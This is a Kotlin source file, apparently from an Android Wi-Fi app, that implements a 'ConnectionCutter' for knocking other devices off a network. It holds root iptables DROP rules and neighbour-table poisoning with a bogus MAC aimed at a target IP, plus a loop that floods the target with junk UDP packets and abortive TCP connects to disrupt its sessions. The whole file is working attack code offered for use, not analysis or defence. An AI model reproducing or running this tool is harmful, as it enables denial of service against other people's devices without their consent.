package com.haris.wifi.net

import com.haris.wifi.data.ConnectedDevice
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.Socket
import java.util.concurrent.ConcurrentHashMap

class ConnectionCutter(private val scope: CoroutineScope) {

    private val activeCutJobs = ConcurrentHashMap<String, Job>()

    /** التحقق من توفر صلاحية الروت (Root) على الهاتف */
    suspend fun checkRootAvailable(): Boolean = withContext(Dispatchers.IO) {
        runCatching {
            val paths = listOf(
                "/system/bin/su",
                "/system/xbin/su",
                "/sbin/su",
                "/su/bin/su",
                "/magisk/.core/bin/su",
            )
            paths.any { File(it).exists() }
        }.getOrDefault(false)
    }

    /** بدء عملية فصل الاتصال عن الجهاز المستهدف */
    fun startCut(
        device: ConnectedDevice,
        gatewayIp: String,
        isRootAvailable: Boolean,
    ) {
        val key = device.uniqueKey
        activeCutJobs[key]?.cancel()

        val job = scope.launch(Dispatchers.IO) {
            if (isRootAvailable) {
                runRootCutCommands(device.ip, gatewayIp, enable = true)
            }

            // حلقة إرباك الجلسة المستمرة طوال فترة الفصل
            val payload = ByteArray(64) { 0x7F }
            val ports = (device.openPorts + listOf(80, 443, 62078, 8008, 5353)).distinct()

            while (isActive) {
                runCatching {
                    val addr = InetAddress.getByName(device.ip)
                    DatagramSocket().use { udp ->
                        udp.soTimeout = 80
                        for (p in listOf(5353, 1900, 137)) {
                            udp.send(DatagramPacket(payload, payload.size, addr, p))
                        }
                    }
                    for (port in ports.take(3)) {
                        runCatching {
                            Socket().use { s ->
                                s.setSoLinger(true, 0)
                                s.connect(InetSocketAddress(device.ip, port), 120)
                            }
                        }
                    }
                }
                delay(1800L)
            }
        }
        activeCutJobs[key] = job
    }

    /** إيقاف الفصل وإعادة الاتصال الطبيعي للجهاز */
    fun stopCut(
        device: ConnectedDevice,
        gatewayIp: String,
        isRootAvailable: Boolean,
    ) {
        val key = device.uniqueKey
        activeCutJobs.remove(key)?.cancel()
        if (isRootAvailable) {
            scope.launch(Dispatchers.IO) {
                runRootCutCommands(device.ip, gatewayIp, enable = false)
            }
        }
    }

    fun stopAll(gatewayIp: String, isRootAvailable: Boolean, ips: List<String>) {
        activeCutJobs.values.forEach { it.cancel() }
        activeCutJobs.clear()
        if (isRootAvailable) {
            scope.launch(Dispatchers.IO) {
                ips.forEach { ip ->
                    runRootCutCommands(ip, gatewayIp, enable = false)
                }
            }
        }
    }

    private fun runRootCutCommands(targetIp: String, gatewayIp: String, enable: Boolean) {
        runCatching {
            val cmds = if (enable) {
                arrayOf(
                    "su", "-c",
                    "iptables -I FORWARD -s $targetIp -j DROP; " +
                        "iptables -I FORWARD -d $targetIp -j DROP; " +
                        "ip neigh replace $targetIp lladdr 00:00:00:00:00:01 dev wlan0 nud permanent"
                )
            } else {
                arrayOf(
                    "su", "-c",
                    "iptables -D FORWARD -s $targetIp -j DROP; " +
                        "iptables -D FORWARD -d $targetIp -j DROP; " +
                        "ip neigh del $targetIp dev wlan0"
                )
            }
            Runtime.getRuntime().exec(cmds).waitFor()
        }
    }
}
